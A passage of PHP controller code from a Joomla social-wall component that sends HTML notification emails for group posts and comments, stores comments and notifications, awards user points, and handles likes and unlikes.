style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:10px 25px;color:#333333;width:620px"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-bottom:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td colspan="2" valign="top" style="height:30px;"><span style="font-size:13px;">'.$emailgreeting.'</span></td></tr><tr><td valign="top" style="width:100%;"><span style="font-size:13px">'.$emailbody.'</span></td><td valign="top" style="padding-right:10px;font-size:0px"><a target="_blank" style="color:#3b5998;text-decoration:none" href="'.$reciverurl.'" title="'.$rName.'"><img style="border:0" src="'.$useravatarimage.'"  /></a></td></tr></tbody></table></td></tr><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" border="0" style="border-collapse:collapse;width:100%"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-right:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td ><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:2px 6px 4px 0px;">'.$emailtext1.'</td></tr></tbody></table></td></tr></tbody></table></td><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="border-width:1px;border-style:solid;border-color:#E3C823;background-color:#FFF9D9"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:2px 6px 4px;border-top:1px solid #fff"><a target="_blank" style="color:#6176b7;text-decoration:none" href="'.$walllink.'"><span style="font-weight:bold;white-space:nowrap;color:#3b5b98;font-size:11px">'.$emailtext2.'</span></a></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr><tr><td>&nbsp;</td></tr><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;">'.$emailfooter.'</td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>';
				
				$body = $emailcontent;				
				$mailer = & JFactory::getMailer();
				$mailer->setSender(array($mainframe->getCfg('mailfrom'), $mainframe->getCfg('fromname')));
				$mailer->setSubject($mainframe->getCfg('fromname').' '.JText::sprintf('COM_COMAWDWALL_EMAIL_GROUP_SUBJECT_NEW_POST', $sName));
				$mailer->setBody($body);
				$mailer->IsHTML(1);
				$mailer->addRecipient($receiver->email);
				$rs = $mailer->Send();		
				}
				
		// sending email to the group memebers
		// getting list of grpmembers
		$query 	= 'SELECT user_id FROM #__awd_groups_members WHERE group_id = ' . (int)$groupId . ' AND status = 1  ' ;
		$db->setQuery($query);
		$grpmemberlist=$db->loadObjectList();
			if($grpmemberlist)
			{
				foreach($grpmemberlist as $c)
				{
					if($c->user_id!=$user->id)
					{
						$receiver = &JFactory::getUser($c->user_id);
						$rName =  AwdwallHelperUser::getDisplayName($c->user_id);
						$sName =  AwdwallHelperUser::getDisplayName($user->id);	
$grplink=JRoute::_(JURI::base().'index.php?option=com_awdwall&task=viewgroup&groupid='.$groupId.'&Itemid='.$itemId,false) ;
$sitename=$mainframe->getCfg('fromname');
$siteaddress=JURI::base();
$useravatarimage=AwdwallHelperUser::getBigAvatar51($user->id);
$emailgreeting=JText::sprintf('COM_COMAWDWALL_EMAIL_GREETING', $rName);
$emailbody=JText::sprintf('COM_COMAWDWALL_EMAIL_NEW_GROUP_POST_BODY',$grplink,$grpname,$sName);	
$emailtext1=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_VIEW_CONVERSATION');	
$emailtext2=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_SEE_POST');
$emailfooter=JText::sprintf('COM_COMAWDWALL_EMAIL_FOOTER',$siteaddress,$sitename);	
$reciverurl=JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$user->id.'&Itemid='.$itemId;
$emailcontent='<table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="font-size:16px;font-family:lucida grande,tahoma,verdana,arial,sans-serif;background:#313131;color:#ffffff;font-weight:bold;vertical-align:baseline;letter-spacing:-0.03em;text-align:left;padding:10px 38px 4px"><a target="_blank" href="'.$siteaddress.'" style="text-decoration:none" title="'.$siteaddress.'"><span style="background:#313131;color:#ffffff;font-weight:bold;font-family:lucida grande,tahoma,verdana,arial,sans-serif;vertical-align:middle;font-size:16px;letter-spacing:-0.03em;text-align:left;vertical-align:baseline"><span class="il">'.$sitename.'</span></span></a></td></tr></tbody></table><table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="border-right:1px solid #ccc;color:#333333;font-size:11px;border-bottom:1px solid #ccc;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;border-top:1px solid #ccc;padding:10px 25px;border-left:1px solid #ccc; background-color:#f7f7f7"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:10px 25px;color:#333333;width:620px"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-bottom:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td colspan="2" valign="top" style="height:30px;"><span style="font-size:13px;">'.$emailgreeting.'</span></td></tr><tr><td valign="top" style="width:100%;"><span style="font-size:13px">'.$emailbody.'</span></td><td valign="top" style="padding-right:10px;font-size:0px"><a target="_blank" style="color:#3b5998;text-decoration:none" href="'.$reciverurl.'" title="'.$rName.'"><img style="border:0" src="'.$useravatarimage.'"  /></a></td></tr></tbody></table></td></tr><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" border="0" style="border-collapse:collapse;width:100%"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-right:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td ><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:2px 6px 4px 0px;">'.$emailtext1.'</td></tr></tbody></table></td></tr></tbody></table></td><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="border-width:1px;border-style:solid;border-color:#E3C823;background-color:#FFF9D9"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:2px 6px 4px;border-top:1px solid #fff"><a target="_blank" style="color:#6176b7;text-decoration:none" href="'.$walllink.'"><span style="font-weight:bold;white-space:nowrap;color:#3b5b98;font-size:11px">'.$emailtext2.'</span></a></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr><tr><td>&nbsp;</td></tr><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;">'.$emailfooter.'</td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>';
						
									
						$body = $emailcontent;				
						$mailer = & JFactory::getMailer();
						$mailer->setSender(array($mainframe->getCfg('mailfrom'), $mainframe->getCfg('fromname')));
						$mailer->setSubject($mainframe->getCfg('fromname').' '.JText::sprintf('COM_COMAWDWALL_EMAIL_GROUP_SUBJECT_NEW_POST', $sName));
						$mailer->setBody($body);
						$mailer->IsHTML(1);
						$mailer->addRecipient($receiver->email);
						$rs = $mailer->Send();		
					}
				}
			}
				
			}
	
	
	}

			// prepend html to main wall		
			$view  = &$this->getView('awdwall', 'html');
			$view->setLayout('msg_block');
			$view->setModel($wallModel);
			$view->getMsgBlock();						
		}else{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId, false), JText::_('Need to login'));
		}
		exit;
	}
	
	function getCommentBox()
	{
		$view  = &$this->getView('awdwall', 'html');
		$view->setLayout('comment_box');
		$view->getCommentBox();
		exit;			
	}
	
	function addComment()
	{
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
		$mainframe	=& JFactory::getApplication();
		$cid 		= JRequest::getInt('cid', 0);
		//msg 		= JRequest::getString('awd_comment_' . $cid);
		$msg= JRequest::getString('awd_comment_' . $cid);
		$receiverId = JRequest::getInt('c_receiver_id_' . $cid, 0);
		$wallId 	= JRequest::getInt('c_wall_id_' . $cid, 0);
		$isReply 	= JRequest::getInt('c_isreply_' . $cid, 0);
		$user 		= &JFactory::getUser();		
		$db 		= &JFactory::getDBO();
		// deleting the notifcation and counter in message
		if($isReply==1)
		{
			$query = "DELETE FROM #__awd_wall_notification WHERE nwallid=".$cid." and ntype='pm' ";
			$db->setQuery($query);
			$db->query();
		}
		$itemId = AwdwallHelperUser::getComItemId();
		if((int)$user->id){
			$wall 				=& JTable::getInstance('Wall', 'Table');
			$msg = AwdwallHelperUser::formatUrlInMsg($msg);							
			$wall->user_id		= $receiverId;
			$wall->type			= 'text';
			$wall->commenter_id	= $user->id;
			$wall->user_name	= '';
			$wall->avatar		= '';
			$wall->message		= nl2br($msg);
			$wall->reply		= $wallId;
			$wall->is_read		= 0;
			$wall->is_pm		= 0;
			$wall->is_reply		= $isReply;
			$wall->posted_id	= NULL;
			$wall->wall_date	= time();
			// store wall to database
			if (!$wall->store()){				
				$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
			}
			//insert into awd_wall_notification table.
		$query 	= "SELECT id FROM #__awd_wall_images WHERE wall_id 	 = "  . $cid;
		$db->setQuery($query);
		$photoid = $db->loadResult();
		if($photoid==NULL || $photoid=='')
		$photoid =0;
		
		$ndate=date("Y-m-d H:i:s");
		$query = 'INSERT INTO #__awd_wall_notification(ndate, nuser, ncreator, ntype, nwallid, ngroupid, nphotoid, nalbumid, nread) VALUES( "'.$ndate.'" , "'.$receiverId.'", "' . $user->id . '", "text", "'.$wall->id.'", "' . $groupId . '"," '.$photoid.'", "","0")';
		$db->setQuery($query);
		$db->query();
			
			// set wall id to view
			JRequest::setVar('wid', $wall->id);
			
		$db =& JFactory::getDBO();
		$query='select * from #__awd_wall where reply='.$wallId.' and commenter_id!='.$user->id.' and commenter_id!='.$receiverId.' and wall_date IS NOT NULL';
		$db->setQuery($query);
		$commentorlist = $db->loadObjectList();
			
			// send email if is enabled
			//$config = &JComponentHelper::getParams('com_awdwall');
			$app = JFactory::getApplication('site');
			$config =  & $app->getParams('com_awdwall');
			$displayName 	= $config->get('display_name', 1);
			$query 	= 'SELECT group_id FROM #__awd_wall WHERE id = ' . (int)$wallId;
			$db->setQuery($query);
			$group_id = $db->loadResult();
			
			if($config->get('email_auto', 0) && ($receiverId != $user->id)){
			if($group_id)
			{
				$walllink=JRoute::_(JURI::base().'index.php?option=com_awdwall&task=viewgroup&groupid='.$group_id.'&Itemid='.$itemId.'#here'.$wallId,false) ;
			}
			else
			{
				$walllink=JRoute::_(JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$receiverId.'&Itemid='.$itemId.'#here'.$wallId,false) ;
			}
				
				$receiver = &JFactory::getUser($receiverId);
				$rName =  AwdwallHelperUser::getDisplayName($receiverId);
				$sName =  AwdwallHelperUser::getDisplayName($user->id);	
							
				if($group_id)
				{
				$query 	= 'SELECT creator FROM #__awd_groups WHERE id = ' . (int)$group_id;
				$db->setQuery($query);
				$creator = $db->loadResult();
				$query 	= 'SELECT title FROM #__awd_groups WHERE id = ' . (int)$group_id;
				$db->setQuery($query);
				$grpname = $db->loadResult();
				
					$grplink=JRoute::_(JURI::base().'index.php?option=com_awdwall&task=viewgroup&groupid='.$group_id.'&Itemid='.$itemId,false) ;
					$emailbody=JText::sprintf('COM_COMAWDWALL_EMAIL_NEW_GROUP_POST_COMMENT_BODY',$grplink,$grpname,$sName);	
$emailsubject=$mainframe->getCfg('fromname').' '.JText::sprintf('COM_COMAWDWALL_EMAIL_SUBJECT_NEW_GROUP_COMMENT', $sName);
				}
				else
				{
					
					$emailbody=JText::sprintf('COM_COMAWDWALL_EMAIL_NEW_POST_COMMENT_BODY',$sName);	
					
$emailsubject=$mainframe->getCfg('fromname').' '.JText::sprintf('COM_COMAWDWALL_EMAIL_SUBJECT_NEW_COMMENT', $sName);

				}
				
$sitename=$mainframe->getCfg('fromname');
$siteaddress=JURI::base();
$useravatarimage=AwdwallHelperUser::getBigAvatar51($user->id);
$emailgreeting=JText::sprintf('COM_COMAWDWALL_EMAIL_GREETING', $rName);
$emailtext1=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_VIEW_CONVERSATION');	
$emailtext2=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_SEE_POST');
$emailfooter=JText::sprintf('COM_COMAWDWALL_EMAIL_FOOTER',$siteaddress,$sitename);	
$reciverurl=JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$user->id.'&Itemid='.$itemId;
$emailcontent='<table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="font-size:16px;font-family:lucida grande,tahoma,verdana,arial,sans-serif;background:#313131;color:#ffffff;font-weight:bold;vertical-align:baseline;letter-spacing:-0.03em;text-align:left;padding:10px 38px 4px"><a target="_blank" href="'.$siteaddress.'" style="text-decoration:none" title="'.$siteaddress.'"><span style="background:#313131;color:#ffffff;font-weight:bold;font-family:lucida grande,tahoma,verdana,arial,sans-serif;vertical-align:middle;font-size:16px;letter-spacing:-0.03em;text-align:left;vertical-align:baseline"><span class="il">'.$sitename.'</span></span></a></td></tr></tbody></table><table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="border-right:1px solid #ccc;color:#333333;font-size:11px;border-bottom:1px solid #ccc;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;border-top:1px solid #ccc;padding:10px 25px;border-left:1px solid #ccc; background-color:#f7f7f7"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:10px 25px;color:#333333;width:620px"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-bottom:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td colspan="2" valign="top" style="height:30px;"><span style="font-size:13px;">'.$emailgreeting.'</span></td></tr><tr><td valign="top" style="width:100%;"><span style="font-size:13px">'.$emailbody.'</span></td><td valign="top" style="padding-right:10px;font-size:0px"><a target="_blank" style="color:#3b5998;text-decoration:none" href="'.$reciverurl.'" title="'.$rName.'"><img style="border:0" src="'.$useravatarimage.'"  /></a></td></tr></tbody></table></td></tr><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" border="0" style="border-collapse:collapse;width:100%"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-right:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td ><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:2px 6px 4px 0px;">'.$emailtext1.'</td></tr></tbody></table></td></tr></tbody></table></td><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="border-width:1px;border-style:solid;border-color:#E3C823;background-color:#FFF9D9"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:2px 6px 4px;border-top:1px solid #fff"><a target="_blank" style="color:#6176b7;text-decoration:none" href="'.$walllink.'"><span style="font-weight:bold;white-space:nowrap;color:#3b5b98;font-size:11px">'.$emailtext2.'</span></a></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr><tr><td>&nbsp;</td></tr><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;">'.$emailfooter.'</td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>';
				
				
				$body=$emailcontent;
				$mailer = & JFactory::getMailer();
				$mailer->setSender(array($mainframe->getCfg('mailfrom'), $mainframe->getCfg('fromname')));
				$mailer->setSubject($emailsubject);
				$mailer->setBody($body);
				$mailer->IsHTML(1);
				$mailer->addRecipient($receiver->email);
				$rs = $mailer->Send();
				// sending email to the
				// send copy to who comments on
//				$sName =  AwdwallHelperUser::getDisplayName($receiverId);
//				$rName =  AwdwallHelperUser::getDisplayName($user->id);				
//				$body = JText::sprintf('Email Body Comment Poster', $rName,$walllink, $sName, JURI::base(), JURI::base());
//				$mailer = & JFactory::getMailer();
//				$mailer->setSender(array($mainframe->getCfg('mailfrom'), $mainframe->getCfg('fromname')));
//				$mailer->setSubject(JText::_($mainframe->getCfg('fromname').' Notification system'));
//				$mailer->setBody($body);
//				$mailer->IsHTML(1);
//				$mailer->addRecipient($user->email);
//				$rs = $mailer->Send();	
			}
			
			if($config->get('email_auto', 0) )
			{
				if($commentorlist)
				{
					foreach($commentorlist as $c)
					{
						if($c->commenter_id!=$user->id)
						{
						$ccc = &JFactory::getUser($c->commenter_id);
						
						$rName =  AwdwallHelperUser::getDisplayName($c->commenter_id);
						$sName =  AwdwallHelperUser::getDisplayName($user->id);					
						$wName =  AwdwallHelperUser::getDisplayName($receiverId);
			if($group_id)
			{
				$walllink=JRoute::_(JURI::base().'index.php?option=com_awdwall&task=viewgroup&groupid='.$group_id.'&Itemid='.$itemId.'#here'.$wallId,false) ;
			}
			else
			{
				$walllink=JRoute::_(JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$receiverId.'&Itemid='.$itemId.'#here'.$wallId,false) ;
			}
				
				if($group_id)
				{
				$query 	= 'SELECT creator FROM #__awd_groups WHERE id = ' . (int)$group_id;
				$db->setQuery($query);
				$creator = $db->loadResult();
				$query 	= 'SELECT title FROM #__awd_groups WHERE id = ' . (int)$group_id;
				$db->setQuery($query);
				$grpname = $db->loadResult();
					$grplink=JRoute::_(JURI::base().'index.php?option=com_awdwall&task=viewgroup&groupid='.$group_id.'&Itemid='.$itemId,false) ;
					$emailbody=JText::sprintf('COM_COMAWDWALL_EMAIL_NEW_GROUP_POST_COMMENT_BODY',$grplink,$grpname,$sName);	
$emailsubject=$mainframe->getCfg('fromname').' '.JText::sprintf('COM_COMAWDWALL_EMAIL_SUBJECT_NEW_GROUP_COMMENT', $sName);
				}
				else
				{
					$emailbody=JText::sprintf('COM_COMAWDWALL_EMAIL_NEW_POST_COMMENT_BODY',$sName);	
$emailsubject=$mainframe->getCfg('fromname').' '.JText::sprintf('COM_COMAWDWALL_EMAIL_SUBJECT_NEW_COMMENT', $sName);
				}
				
$sitename=$mainframe->getCfg('fromname');
$siteaddress=JURI::base();
$useravatarimage=AwdwallHelperUser::getBigAvatar51($user->id);
$emailgreeting=JText::sprintf('COM_COMAWDWALL_EMAIL_GREETING', $rName);
$emailtext1=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_VIEW_CONVERSATION');	
$emailtext2=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_SEE_POST');
$emailfooter=JText::sprintf('COM_COMAWDWALL_EMAIL_FOOTER',$siteaddress,$sitename);	
$reciverurl=JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$user->id.'&Itemid='.$itemId;
$emailcontent='<table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="font-size:16px;font-family:lucida grande,tahoma,verdana,arial,sans-serif;background:#313131;color:#ffffff;font-weight:bold;vertical-align:baseline;letter-spacing:-0.03em;text-align:left;padding:10px 38px 4px"><a target="_blank" href="'.$siteaddress.'" style="text-decoration:none" title="'.$siteaddress.'"><span style="background:#313131;color:#ffffff;font-weight:bold;font-family:lucida grande,tahoma,verdana,arial,sans-serif;vertical-align:middle;font-size:16px;letter-spacing:-0.03em;text-align:left;vertical-align:baseline"><span class="il">'.$sitename.'</span></span></a></td></tr></tbody></table><table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="border-right:1px solid #ccc;color:#333333;font-size:11px;border-bottom:1px solid #ccc;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;border-top:1px solid #ccc;padding:10px 25px;border-left:1px solid #ccc; background-color:#f7f7f7"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:10px 25px;color:#333333;width:620px"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-bottom:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td colspan="2" valign="top" style="height:30px;"><span style="font-size:13px;">'.$emailgreeting.'</span></td></tr><tr><td valign="top" style="width:100%;"><span style="font-size:13px">'.$emailbody.'</span></td><td valign="top" style="padding-right:10px;font-size:0px"><a target="_blank" style="color:#3b5998;text-decoration:none" href="'.$reciverurl.'" title="'.$rName.'"><img style="border:0" src="'.$useravatarimage.'"  /></a></td></tr></tbody></table></td></tr><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" border="0" style="border-collapse:collapse;width:100%"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-right:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td ><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:2px 6px 4px 0px;">'.$emailtext1.'</td></tr></tbody></table></td></tr></tbody></table></td><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="border-width:1px;border-style:solid;border-color:#E3C823;background-color:#FFF9D9"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:2px 6px 4px;border-top:1px solid #fff"><a target="_blank" style="color:#6176b7;text-decoration:none" href="'.$walllink.'"><span style="font-weight:bold;white-space:nowrap;color:#3b5b98;font-size:11px">'.$emailtext2.'</span></a></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr><tr><td>&nbsp;</td></tr><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;">'.$emailfooter.'</td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>';
				

						$body = $emailcontent;
						
						$mailer = & JFactory::getMailer();
						$mailer->setSender(array($mainframe->getCfg('mailfrom'), $mainframe->getCfg('fromname')));
						$mailer->setSubject($emailsubject);
						$mailer->setBody($body);
						$mailer->IsHTML(1);
						$mailer->addRecipient($ccc->email);
						$rs = $mailer->Send();
					  }
					}
				}
				
			}
			// prepend html to main wall	
			// AUP POINTS
			if($isReply!=1)
			{
				$query='select type from #__awd_wall where id='.$cid.' and wall_date IS NOT NULL';
				$db->setQuery($query);
				$type = $db->loadResult();
				$query='select commenter_id from #__awd_wall where id='.$cid.' and wall_date IS NOT NULL';
				$db->setQuery($query);
				$commenter_id = $db->loadResult();
				if($commenter_id!=$user->id)
				{
					$api_AUP = JPATH_SITE.DS.'components'.DS.'com_alphauserpoints'.DS.'helper.php';
					if ( file_exists($api_AUP)){				
						require_once ($api_AUP);
						$keyreference  = AlphaUserPointsHelper::buildKeyreference('plgaup_points4jomwallupdate', $cid );
						if($type=='image')
						{
						 AlphaUserPointsHelper::newpoints('plgaup_points4jomwallphotocomment','', $keyreference);
						}
						else
						{
						 AlphaUserPointsHelper::newpoints('plgaup_points4jomwallwallcomment','', $keyreference);
						}
					}
				}
			}
				
			$view  = &$this->getView('awdwall', 'html');
			$view->setLayout('comment_block');
			$view->getCommentBlock();
		}else{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId, false), JText::_('Need to login'));
		}
		exit;
	}
	
	function deleteMsg()
	{
		$wid    	= JRequest::getInt('wid', 0);
		$wallModel 	= $this->getModel('wall');
		$wallModel->deleteMsg($wid);
		exit;
	}
	
	function deleteComment()
	{
		$wid    	= JRequest::getInt('wid', 0);
		$wallModel 	= $this->getModel('wall');
		$wallModel->deleteComment($wid);
		exit;
	}
	
	function addLikeMsg()
	{			
		$Itemid = AwdwallHelperUser::getComItemId();
		
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
		$user 		= &JFactory::getUser();			
		$db 		= &JFactory::getDBO();
		$wallId 	= JRequest::getInt('wid', 0);
		$cId 		= JRequest::getInt('cid', $user->id);
		//if($cId==0){cId=$user->id;}
		if((int)$user->id){
		$query='select count(*) as count from #__awd_wall_comment_like  where wall_id='.$wallId.' and user_id='.$user->id;
		$db->setQuery($query);
		$count = $db->loadResult();
		if(!$count)
		{	
			$query = 'INSERT INTO #__awd_wall_comment_like(wall_id, user_id) VALUES(' . $wallId . ', ' . $user->id . ')';
			$db->setQuery($query);
			// store like to database
			if (!$db->query()){	
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$Itemid , false ), $db->getErrorMsg());
			}
		}
			// store into wall
//			$Itemid = AwdwallHelperUser::getComItemId();
//
//			$wall 				=& JTable::getInstance('Wall', 'Table');						
//
//			$wall->user_id		= $cId;
//
//			$wall->type			= 'like';
//
//			$wall->commenter_id	= $user->id;
//
//			$wall->user_name	= '';
//
//			$wall->avatar		= '';
//
//			$wall->message		= '';
//
//			$wall->reply		= 0;
//
//			$wall->is_read		= 0;
//
//			$wall->is_pm		= 0;
//
//			$wall->is_reply		= 0;
//
//			$wall->posted_id	= NULL;
//
//			$wall->wall_date	= time();			
//
//			// store wall to database
//
//			if (!$wall->store()){				
//
//				$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main' , false ), JText::_('Post Failed'));
//
//			}
		}else{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$Itemid, false), JText::_('Need to login'));
		}
		exit;
	}
	
	function deletelikemsg()
	{
		$db 	= &JFactory::getDBO();
		$wid 	= JRequest::getInt('wid', 0);
		$user = &JFactory::getUser();
		$query 	= 'DELETE FROM #__awd_wall_comment_like WHERE wall_id = ' . (int)$wid.' AND user_id='.$user->id;
		$db->setQuery($query);
		$db->query();
		
		
	}
	
	function getcLikeMsg()
	{
		$db 	= &JFactory::getDBO();
		$wid 	= JRequest::getInt('wid', 0);
		$user = &JFactory::getUser();
		$Itemid = AwdwallHelperUser::getComItemId();	
		$query 	= 'SELECT count(*) as totallike FROM #__awd_wall_comment_like WHERE wall_id = ' . (int)$wid . ' ';
		$db->setQuery($query);
		$totallike = $db->loadResult();
		$query 	= 'SELECT count(*) as canlike FROM #__awd_wall_comment_like WHERE wall_id = ' . (int)$wid.' AND user_id='.$user->id;
		$db->setQuery($query);
		$canlike = $db->loadResult();
		if($totallike)
		{
			//echo  '<a href="#"><span class="likespan">'.$totallike.'</span></a>';
		if($canlike)
		{
		?>
        
	&nbsp;&nbsp;
	<a href="javascript:void(0);" onclick="deleteLikeCommentBox('<?php echo JURI::base().'index.php?option=com_awdwall&view=awdwall&task=deletelikemsg&wid=' . $wid  . '&cid=' .(int)$user->id.'&tmpl=component';?>', '<?php echo JURI::base().'index.php?option=com_awdwall&view=awdwall&task=getclikemsg&wid=' . (int)$wid . '&tmpl=component&Itemid='.$Itemid;?>', '<?php echo (int)$wid;?>');"><?php echo JText::_('Unlike');?></a> &nbsp;&nbsp;<span class="likespan"><?php echo $totallike;?></span>
		<?php 
        }
        else
        {
		
        ?>
	&nbsp;&nbsp;
